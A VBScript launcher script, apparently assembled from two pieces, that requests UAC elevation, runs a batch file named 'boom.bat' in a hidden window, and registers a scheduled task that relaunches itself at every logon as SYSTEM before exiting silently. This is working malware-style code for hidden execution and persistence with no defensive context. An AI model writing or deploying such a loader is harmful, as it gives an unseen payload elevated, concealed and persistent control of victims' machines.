Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Set working directory to the current folder
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION ---
If Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt. 0 = Hidden, 1 = Visible (use 1 for testing)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

' --- STEP 2: START THE CHAIN ---
' Runs boom.bat completely hidden (0)

WshShell.Run "cmd.exe /c boom.bat", 0, True





' Add this code at the end of your launcher.vbs file

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get current directory and launcher path
currentDir = objFSO.GetAbsolutePathName(".")
launcherPath = currentDir & "\launcher.vbs"

' Create scheduled task using schtasks directly
Set objExec = objShell.Exec("schtasks /create /tn ""AutoLauncher"" /tr """ & launcherPath & """ /sc onlogon /delay 00:30 /f /ru SYSTEM /it")

' Wait for task creation to complete
Do While objExec.Status = 0
    WScript.Sleep 100
Loop

' Clean up and exit silently
Set objExec = Nothing
Set objShell = Nothing
Set objFSO = Nothing
WScript.Quit
